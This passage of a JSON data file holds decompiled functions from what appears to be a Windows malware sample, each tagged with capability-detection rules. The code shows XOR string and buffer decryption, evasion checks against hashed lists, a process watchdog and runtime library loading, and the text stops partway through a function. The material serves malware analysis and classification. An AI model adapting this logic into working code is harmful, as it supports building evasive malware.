        "decompiled_code": "\nuint __fastcall fcn.0040a64c(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint lpCommandLine;\n    uint var_44h;\n    \n    iVar2 = 0x44;\n    puVar3 = param_1;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_44h;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_44h = 0x44;\n    puVar3 = &lpCommandLine;\n    for (iVar1 = 0x208; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpCommandLine, L\"%s --\", *0x41cb38);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_44h, param_1);\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    return *param_1;\n}\n",
        "token_count": 361
    },
    "0040a859": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a859(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uchar *puStack572;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    puVar7 = &stack0xfffffde0;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &stack0xfffffdf0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x41cb48 == 0) {\n        puStack572 = 0x40a8a0;\n        *0x41cb7c = fcn.0040a64c();\n    }\n    else {\n        puStack572 = 0x40a895;\n        *0x41cb7c = fcn.0040a3a7();\n    }\n    if (*0x41cb7c == 0) {\n        piVar6 = &stack0xfffffdf0;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - &stack0xfffffdf2 >> 1 != 0) {\n            puStack572 = &stack0xfffffdf0;\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)();\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        puStack572 = 0x40a8b4;\n        fcn.0040836f();\n        iStack552 = *0x41cb7c;\n        puStack572 = 0xffffffff;\n        uStack548 = *0x41cb34;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &stack0xfffffdd8, 0);\n        puStack572 = NULL;\n        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(*0x41cb7c, &stack0xfffffdc4);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41cb7c, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040a859, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        (*pcVar2)(*0x41cb7c);\n    }\n    puStack572 = NULL;\n    (*_sym.imp.KERNEL32.dll_ExitThread)();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 739
    },
    "0040a95f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a95f(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uint var_30ch;\n    uint var_104h;\n    \n    puVar5 = &var_104h;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    puVar5 = &var_30ch;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    if (*0x41cb48 == 0) {\n        uVar3 = 0;\n        while (*(uVar3 + 0x4103d0) != arg_ch) {\n            uVar3 = uVar3 + 4;\n            if (0x2b < uVar3) {\n                return 1;\n            }\n        }\n        if (arg_10h == *0x41cb3c) {\n            return 1;\n        }\n        if (arg_ch == -0x37b0bf10) {\n            puVar5 = &var_104h;\n            for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            var_104h._0_1_ = 0;\n            if ((arg_14h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar4 != 0)) {\n                (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar4, &var_104h, 0x104);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            pcVar6 = _sym.imp.KERNEL32.dll_lstrlenA;\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_104h);\n            if (iVar4 != 0) {\n                (*pcVar6)(&var_104h);\n                iVar4 = fcn.00405d90();\n                if (iVar4 == -0x37b0bf10) {\n                    return 1;\n                }\n            }\n        }\n        iVar4 = fcn.004085c3();\n        if (iVar4 != 0) {\n            return 1;\n        }\n        puVar5 = &var_30ch;\n        for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar4 = fcn.0040836f();\n        if (iVar4 == 0) {\n            return 1;\n        }\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_30ch, 0x41cb80);\n        if (iVar4 != 0) {\n            return 1;\n        }\n        pcVar6 = fcn.00408880;\n    }\n    else {\n        if (arg_ch != 0x74fc6984) {\n            return 1;\n        }\n        iVar4 = fcn.004085c3();\n        if (iVar4 != 0) {\n            return 1;\n        }\n        iVar4 = fcn.0040836f();\n        if (iVar4 == 0) {\n            return 1;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_30ch);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(&var_30ch);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        *(iVar4 + 8) = arg_10h;\n        pcVar6 = fcn.0040a859;\n        arg_10h = iVar4;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, pcVar6, arg_10h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    return 1;\n}\n",
        "token_count": 1065
    },
    "0040ad08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ad08(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41cb48 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41cb34, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41cb80;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.0040836f();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040a6c9, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x412490) = *(uVar5 + 0x412490) ^ \"XbAtXhRUKArkYmp\"[uVar5 % 0xf];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x416890) = *(uVar5 + 0x416890) ^ str.bIG0iEw66qDxAJ_H_3_[uVar5 % 0xc];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040ab19, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41cb30 == 0) {\n        fcn.0040e689();\n        if (*0x41cb48 != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 684
    },
    "0040bff2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040bff2(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.0040e689();\n        if (var_4h == 0) {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 276
    },
    "0040c05c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040c05c(void)\n\n{\n    int32_t iVar1;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_8h = 0x278cdf58;\n    iVar1 = 0;\n    var_bch = 0x2d386ece;\n    var_b8h = 0xaba416e3;\n    var_b4h = 0xbffde1f0;\n    var_b0h = 0x6fadb57b;\n    var_ach = 0x581419ac;\n    var_a8h = 0xa93a5da5;\n    var_a4h = 0x9fe09b81;\n    var_a0h = 0x62b621c4;\n    var_9ch = 0xe2f42d3;\n    var_98h = 0x1cb3f267;\n    var_94h = 0x7deed7db;\n    var_90h = 0x487c3558;\n    var_8ch = 0xbc541011;\n    var_88h = 0x70f400cf;\n    var_84h = 0x7e11e4cf;\n    var_80h = 0x52feb192;\n    var_7ch = 0x1e24d477;\n    var_78h = 0x4a6b6ebc;\n    var_74h = 0x6de558e4;\n    var_70h = 0x6e4851f8;\n    var_6ch = 0x9f5462ed;\n    var_68h = 0x896773d7;\n    var_64h = 0x68b0f30d;\n    var_60h = 0x7b8b2670;\n    var_5ch = 0x1e84d9c6;\n    var_58h = 0xf9b64044;\n    var_54h = 0x11e91917;\n    var_50h = 0x7ec953ab;\n    var_4ch = 0xafb3480;\n    var_48h = 0x5d5421cf;\n    var_44h = 0x4055c0a5;\n    var_40h = 0xb4c2ed27;\n    var_3ch = 0x6751a7a7;\n    var_38h = 0xf0fc4f7;\n    var_34h = 0xbf550eed;\n    var_30h = 0x1b54824;\n    var_2ch = 0x72c7bd89;\n    var_28h = 0xb15afa72;\n    var_24h = 0xd35c5e5c;\n    var_20h = 0x86bd8b3a;\n    var_1ch = 0x334b7fa5;\n    var_18h = 0x47e5605f;\n    var_14h = 0xe1e54873;\n    var_10h = 0xd8367b99;\n    do {\n        var_4h = 0;\n        fcn.0040e689();\n        if (var_4h != 0) {\n            return 1;\n        }\n        var_8h = (&var_bch)[iVar1];\n        iVar1 = iVar1 + 1;\n    } while (var_8h != 0);\n    return 0;\n}\n",
        "token_count": 1111
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar uStack40;\n    uchar var_23h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t lpLibFileName;\n    code *pszFirst;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    var_8h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar5)(uVar1 | 2);\n    var_30h._0_1_ = 0x31;\n    var_30h._1_1_ = 0xf;\n    var_30h._2_1_ = 0x7c;\n    var_30h._3_1_ = 0x20;\n    var_2ch = 0x6950583b;\n    var_28h._0_1_ = 0x5d;\n    var_28h._1_1_ = 0;\n    var_28h._2_1_ = 0x1b;\n    var_28h._3_1_ = 0x6b;\n    var_20h = 0x6c394762;\n    var_1ch._0_2_ = 0x6b77;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 0x6;\n    iVar8 = 0;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar4 != 0xe218c4) {\n            *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_30h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_38h._0_2_ = 0x3d71;\n    var_38h._2_1_ = 0x35;\n    stack0xffffffc7 = 0x365c2224;\n    var_34h._3_1_ = 0x14;\n    var_30h._0_1_ = 0x20;\n    var_30h._1_1_ = 0x2d;\n    var_30h._2_1_ = 0x57;\n    var_30h._3_1_ = 6;\n    var_2ch = 0x55310837;\n    var_28h._0_1_ = 0x24;\n    var_28h._1_1_ = 0xf;\n    var_28h._2_1_ = 0x49;\n    var_18h = 0x49585232;\n    var_14h._0_1_ = 0x43;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 0x5;\n    iVar8 = 0;\n    pszFirst = &var_38h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar4 != 0x145248) {\n            *(iVar8 + iVar3) = *(&var_18h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_38h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x13);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    var_18h = (*pcVar5)(uVar2, &var_8h);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pcVar7 = pcVar6;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *pcVar7 = 0x0;\n        pcVar7 = pcVar7 + 1;\n    }\n    pszFirst = pcVar6;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, pcVar6, 0x104);\n    var_38h._0_2_ = 0x5729;\n    var_38h._2_1_ = 6;\n    stack0xffffffc7 = 0x24443565;\n    var_34h._3_1_ = 0x75;\n    var_30h._1_1_ = 0x41;\n    var_30h._2_1_ = 0x6a;\n    var_30h._3_1_ = 0x57;\n    var_2ch = 0x44396510;\n    var_28h._0_1_ = 0x32;\n    var_28h._1_1_ = 0x75;\n    var_28h._2_1_ = 0x65;\n    var_28h._3_1_ = 0x41;\n    var_20h = 0x65755744;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x41);\n    *0x41cb38 = pcVar6;\n    var_30h._0_1_ = var_38h._2_1_;\n    uVar2 = (*pcVar5)(8, 0x29);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    lpLibFileName = &var_38h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCursor)();\n        pcVar5 = pszFirst;\n        if (iVar4 != 0x77220d) {\n            *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_38h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar3);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) goto code_r0x0040c5dd;\n    uVar2 = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0, pcVar5);\n    fcn.00404392(uVar2);\n    do {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x0040c5dd:\n            if (1 < var_8h) {\n                *0x41cb38 = *(var_18h + 4);\n            }\n            *0x41cb50 = fcn.0040c392();\n            fcn.00405ab9();\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            iVar3 = fcn.004060e2();\n            (*_sym.imp.KERNEL32.dll_GetVersion)();\n            if (iVar3 != 1) break;\n            fcn.00401033();\n            uVar2 = (*pcVar7)(0, pcVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        var_70h = 0x4b366b55;\n        var_6ch = 0x773b7032;\n        var_68h = 0x6b31620f;\n        var_64h = 0x70234b23;\n        var_60h = 0x6217774e;\n        var_5ch = 0x4b1e6b3d;\n        var_58h = 0x77197001;\n        var_54h = 0x6b036224;\n        var_50h = 0x70044b18;\n        var_4ch = 0x6217771f;\n        var_48h = 0x4b196b39;\n        var_44h = 0x770e7016;\n        var_40h = 0x6b1e6239;\n        var_3ch = 0x70164b12;\n        var_38h._0_2_ = 0x774b;\n        var_38h._2_1_ = 0xe;\n        stack0xffffffc7 = 0x76b0862;\n        var_34h._3_1_ = 0x4b;\n        var_30h._0_1_ = 0xe;\n        var_30h._1_1_ = 0x70;\n        var_30h._2_1_ = 4;\n        var_30h._3_1_ = 0x77;\n        var_2ch = 0x6b156239;\n        var_28h._0_1_ = 5;\n        var_28h._1_1_ = 0x4b;\n        var_28h._2_1_ = 0x3e;\n        var_28h._3_1_ = 0x70;\n        uStack40 = 0x6b;\n        var_23h = 0x77;\n        var_20h = 0x4b776b70;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x62);\n        uVar2 = (*pcVar7)(8, 0x9d);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        var_18h = &var_70h - iVar3;\n        lpLibFileName = iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n            if (iVar4 != 0xe058da) {\n                *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_70h - iVar3];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x4e);\n        var_4ch = 0x50653944;\n        var_48h = 0x364a611b;\n        var_44h = 0x39046224;\n        var_40h = 0x6130505b;\n        var_3ch = 0x623f3656;\n        var_38h._0_2_ = 0x3915;\n        var_38h._2_1_ = 0x13;\n        stack0xffffffc7 = 0x6d613e50;\n        var_34h._3_1_ = 0x36;\n        var_30h._0_1_ = 0x31;\n        var_30h._1_1_ = 0x62;\n        var_30h._2_1_ = 0x12;\n        var_30h._3_1_ = 0x39;\n        var_2ch = 0x6111505d;\n        var_28h._0_1_ = 0x65;\n        var_28h._1_1_ = 0x36;\n        var_28h._2_1_ = 0x50;\n        var_28h._3_1_ = 0x62;\n        var_20h = 0x50363961;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x62);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        var_18h = &var_4ch - iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_DestroyCaret)();\n            if (iVar4 != 0x67fe74) {\n                *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_4ch - iVar3];\n            }\n            pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x28);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        pszFirst = pcVar5;\n        uVar2 = (*pcVar7)(8, 0x208);\n        var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *pcVar5 = 0x0;\n            pcVar5 = pcVar5 + 1;\n        }\n        puVar9 = var_4h;\n        for (iVar8 = 0x208; pcVar5 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(lpLibFileName, pszFirst, 0x104);\n        (*pcVar5)(iVar3, var_4h, 0x104);\n        iVar3 = fcn.00401fd8();\n        if (iVar3 == 0) {\n            iVar3 = fcn.0040c05c();\n            if (iVar3 == 0) {\n                iVar3 = fcn.0040c208();\n                if (iVar3 == 0) goto code_r0x0040c82c;\n            }\n        }\n        else {\ncode_r0x0040c82c:\n            pcVar6 = pszFirst;\n            pcVar5 = _sym.imp.SHLWAPI.dll_StrStrIW;\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41cb38, pszFirst);\n            if (iVar3 != 0) {\ncode_r0x0040c858:\n                fcn.0040c2a2();\n                uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004028fa, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n                uVar2 = (*pcVar7)(0, pcVar6);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*pcVar7)(0, var_4h);\n                (*pcVar5)(uVar2);\n                do {\n                    (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n                } while( true );\n            }\n            iVar3 = (*pcVar5)(*0x41cb38, var_4h);\n            if (iVar3 != 0) goto code_r0x0040c858;\n            fcn.004079f6();\n        }\n        fcn.0040e32d();\n    } while( true );\n}\n",
        "token_count": 3806
    },
    "0040c977": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.0040c977(void)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint lpWSAData;\n    uint ARG_0;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint32_t var_64h;\n    uint32_t var_60h;\n    uint var_5ch;\n    int32_t *var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    char *var_18h;\n    int32_t var_14h;\n    char *var_10h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_70h = *0x41cb78;\n    var_64h = *0x41caac;\n    var_54h = 0x2e175b29;\n    var_50h = 0x512f250f;\n    var_4ch = 0x2f01201d;\n    var_48h = 0x3a1b5725;\n    var_44h = 0x4d3b311b;\n    var_40h = 0x3b1d3c01;\n    var_3ch = 0x675a4331;\n    var_38h = 0xa7a7235;\n    var_34h = 0x745c7f40;\n    var_30h = 0x4a440070;\n    var_8h = 0x4a743948;\n    var_4h._0_2_ = 0x436a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    var_10h = pcVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar6 != 0x2bbc49) {\n            var_14h = 6;\n            pcVar5[iVar9] = *(&var_8h + iVar9 % 6) ^ (pcVar5 + iVar9)[&var_54h - pcVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x28);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    var_14h = 0;\n    var_ch = 0x4122f0;\n    do {\n        var_68h = 0;\n        var_60h = 0;\n        iVar9 = 0;\n        var_5ch = 1;\n        do {\n            if (var_ch[var_14h] != '\\0') {\n                cVar3 = *pcVar5;\n                pcVar8 = pcVar5;\n                while (cVar3 != var_ch[var_14h]) {\n                    if (cVar3 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x0040ca8d;\n                    }\n                    pcVar8 = pcVar8 + 1;\n                    cVar3 = *pcVar8;\n                }\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x20);\n        bVar1 = true;\ncode_r0x0040ca8d:\n        if (((*var_ch != '\\0') && (var_ch[0x1f] == '\\0')) && (bVar1)) {\n            var_2ch = 0x1373b67;\n            var_28h = 0x34203b47;\n            puVar10 = &ARG_0;\n            for (iVar9 = 